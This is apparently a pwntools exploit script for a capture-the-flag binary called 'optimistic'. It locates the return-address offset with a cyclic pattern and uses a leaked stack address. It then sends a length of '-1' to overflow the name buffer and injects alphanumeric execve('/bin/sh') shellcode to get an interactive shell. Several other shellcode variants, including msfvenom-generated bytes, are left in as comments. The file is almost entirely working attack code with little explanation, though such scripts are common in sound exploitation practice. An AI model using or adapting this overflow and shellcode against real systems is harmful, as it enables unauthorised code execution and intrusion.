from pwn import *


# Allows you to switch between local/GDB/remote from terminal
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)


def find_ip(payload):
    # Launch process and send payload
    p = process(exe)
    p.sendlineafter(':', 'y')  # Yes, we want to enrol
    p.sendlineafter('Email:', '420')  # Provide email address - only reads 8 bytes
    p.sendlineafter('Age:', '1337')  # Provide age - also reads 8 bytes
    p.sendlineafter('Length of name:', '-1')  # Provide length of name - needs to be <= 64
    p.sendlineafter('Name:', payload)  # Provide name (needs to be within length previously specified)
    # Wait for the process to crash
    p.wait()
    # Print out the address of EIP/RIP at the time of crashing
    # ip_offset = cyclic_find(p.corefile.pc)  # x86
    ip_offset = cyclic_find(p.corefile.read(p.corefile.sp, 4))  # x64
    info('located EIP/RIP offset at {a}'.format(a=ip_offset))
    return ip_offset


# Specify your GDB script here for debugging
gdbscript = '''
init-pwndbg
breakrva 0x00001368
continue
'''.format(**locals())


# Set up pwntools for the correct architecture
exe = './optimistic'
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# Enable verbose logging so we can see exactly what is being sent (info/debug)
context.log_level = 'debug'

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================

# Pass in pattern_size, get back EIP/RIP offset
offset = find_ip(cyclic(1000))

# Start program
io = start()

io.sendlineafter(':', 'y')  # Yes, we want to enrol

# Get leaked stack address
stack_addr = int(re.search(r"(0x[\w\d]+)", io.recvlineS()).group(0), 16)
info("leaked stack_addr: %#x", stack_addr)
# We need to remove 96 bytes to point at RSP instead of RBP
stack_addr -= 96

# Create a shell - method 1
# shellcode = asm(shellcraft.sh())
# Encode alphanum
# shellcode = alphanumeric(shellcode)

# Create a shell - method 2
# msfvenom -f python -p linux/x64/exec -a x86_64 --platform linux CMD=/bin/sh -e x86/alpha_mixed
# shellcode = b""
# shellcode += b"\x89\xe2\xdb\xc2\xd9\x72\xf4\x58\x50\x59\x49\x49\x49"
# shellcode += b"\x49\x49\x49\x49\x49\x49\x49\x43\x43\x43\x43\x43\x43"
# shellcode += b"\x37\x51\x5a\x6a\x41\x58\x50\x30\x41\x30\x41\x6b\x41"
# shellcode += b"\x41\x51\x32\x41\x42\x32\x42\x42\x30\x42\x42\x41\x42"
# shellcode += b"\x58\x50\x38\x41\x42\x75\x4a\x49\x32\x4a\x47\x4b\x76"
# shellcode += b"\x38\x6d\x49\x37\x38\x4d\x6b\x34\x6f\x30\x62\x33\x59"
# shellcode += b"\x50\x6e\x34\x6f\x44\x33\x62\x48\x65\x50\x51\x43\x61"
# shellcode += b"\x58\x6b\x39\x78\x67\x72\x48\x76\x4d\x75\x33\x73\x30"
# shellcode += b"\x37\x70\x50\x48\x6c\x49\x6d\x36\x52\x72\x58\x68\x73"
# shellcode += b"\x38\x63\x30\x37\x70\x67\x70\x74\x6f\x33\x52\x52\x49"
# shellcode += b"\x50\x6e\x66\x4f\x70\x73\x53\x58\x45\x50\x66\x36\x56"
# shellcode += b"\x37\x70\x48\x4e\x69\x68\x66\x56\x6f\x43\x35\x41\x41"

# Create a shell - method 3
# msfvenom -f python -p linux/x64/exec --platform linux CMD=/bin/sh
# shellcode = b""
# shellcode += b"\x6a\x3b\x58\x99\x48\xbb\x2f\x62\x69\x6e\x2f\x73\x68"
# shellcode += b"\x00\x53\x48\x89\xe7\x68\x2d\x63\x00\x00\x48\x89\xe6"
# shellcode += b"\x52\xe8\x0a\x00\x00\x00\x2f\x62\x69\x6e\x2f\x62\x61"
# shellcode += b"\x73\x68\x00\x56\x57\x48\x89\xe6\x0f\x05"
# shellcode = alphanumeric(shellcode)

# Create a shell - method 4
# Position independent & Alphanumeric 64-bit execve("/bin/sh\0",NULL,NULL); (87 bytes) - https://www.exploit-db.com/exploits/35205
shellcode = "XXj0TYX45Pk13VX40473At1At1qu1qv1qwHcyt14yH34yhj5XVX1FK1FSH3FOPTj0X40PP4u4NZ4jWSEW18EF0V"

# Build the payload
payload = flat([
    shellcode,  # Shellcode
    cyclic(offset - len(shellcode)),  # Pad up to RIP
    stack_addr  # RBP - 96 (our shellcode)
])

# Send the payload
io.sendlineafter('Email:', '420')  # Provide email address - only reads 8 bytes
io.sendlineafter('Age:', '1337')  # Provide age - also reads 8 bytes
io.sendlineafter('Length of name:', '-1')  # Provide length of name - needs to be <= 64 (or use -1 to exploit)
io.sendlineafter('Name:', payload)  # Provide name (payload)

# Got Shell?
io.interactive()
